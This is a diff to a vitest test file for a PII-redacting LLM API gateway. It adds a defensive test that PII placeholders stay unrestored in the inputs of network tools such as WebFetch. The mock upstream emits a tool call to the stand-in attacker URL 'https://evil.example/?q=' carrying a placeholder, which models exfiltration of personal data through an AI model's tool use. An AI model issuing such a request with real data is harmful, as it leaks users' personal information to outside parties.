@@ -9,23 +9,14 @@
 import type { AddressInfo } from 'node:net';
 import type { NullPii } from 'nullpii';
 import { PiiVault } from 'nullpii';
+
 import { afterEach, describe, expect, it } from 'vitest';
 import type { GatewayConfig } from '../src/config.js';
 import { buildServer } from '../src/server.js';
 import type { AnthropicResponse } from '../src/types.js';
+import { BASE_TEST_CONFIG } from './fixtures.js';
 
-const TEST_CONFIG: GatewayConfig = {
-  host: '127.0.0.1',
-  port: 0,
-  upstreamBaseUrl: 'https://upstream.test',
-  openaiUpstreamBaseUrl: 'https://openai.test',
-  vaultTtlMs: 60_000,
-  backend: 'cpu',
-  logLevel: 'fatal',
-  bodyLimitBytes: 10 * 1024 * 1024,
-  logTraffic: false,
-  sidecarMaxSessions: 64,
-};
+const TEST_CONFIG: GatewayConfig = BASE_TEST_CONFIG;
 
 /**
  * Mock NullPii: a real PiiVault for placeholder bookkeeping + a
@@ -422,6 +413,67 @@ describe('gateway · tool_use coverage', () => {
     expect(block.type).toBe('tool_use');
     expect(block.input.body).toBe('Subject: John');
     expect(block.input.body).not.toContain('{{PII_');
+  });
+
+  it('keeps placeholders in the input of a tool outside restoreTools (JSON and SSE)', async () => {
+    const { np } = buildMockNullPii();
+    const echoInTool = (name: string) =>
+      buildMockFetch((call) => {
+        const forwarded = JSON.parse(call.init.body as string) as {
+          messages: Array<{ content: string }>;
+          stream?: boolean;
+        };
+        const placeholder = forwarded.messages[0]?.content.match(/\{\{PII_[^}]+\}\}/)?.[0] ?? '';
+        const input = { url: `https://evil.example/?q=${placeholder}` };
+        if (forwarded.stream !== true) {
+          const resp: AnthropicResponse = {
+            id: 'msg',
+            type: 'message',
+            role: 'assistant',
+            content: [{ type: 'tool_use', id: 'tu_net', name, input }],
+          };
+          return { body: JSON.stringify(resp) };
+        }
+        const frames = [
+          {
+            type: 'content_block_start',
+            index: 0,
+            content_block: { type: 'tool_use', id: 'tu_net', name, input: {} },
+          },
+          {
+            type: 'content_block_delta',
+            index: 0,
+            delta: { type: 'input_json_delta', partial_json: JSON.stringify(input) },
+          },
+          { type: 'content_block_stop', index: 0 },
+        ];
+        return {
+          body: frames.map((f) => `event: ${f.type}\ndata: ${JSON.stringify(f)}\n\n`).join(''),
+          headers: { 'content-type': 'text/event-stream' },
+        };
+      });
+    for (const name of ['WebFetch', 'mcp__browser__navigate']) {
+      for (const stream of [false, true]) {
+        const app = await buildServer({
+          config: TEST_CONFIG,
+          np,
+          fetchImpl: echoInTool(name).fetchImpl,
+        });
+        trackApp(app);
+        const res = await app.inject({
+          method: 'POST',
+          url: '/v1/messages',
+          payload: {
+            model: 'claude-test',
+            stream,
+            messages: [{ role: 'user', content: 'Find John' }],
+          },
+        });
+        expect(res.statusCode, `${name} stream=${stream}`).toBe(200);
+        expect(res.body, `${name} stream=${stream}`).toContain('{{PII_');
+        expect(res.body, `${name} stream=${stream}`).not.toContain('q=John');
+      }
+    }
   });
 
   it('sanitises tools[].description on the request', async () => {
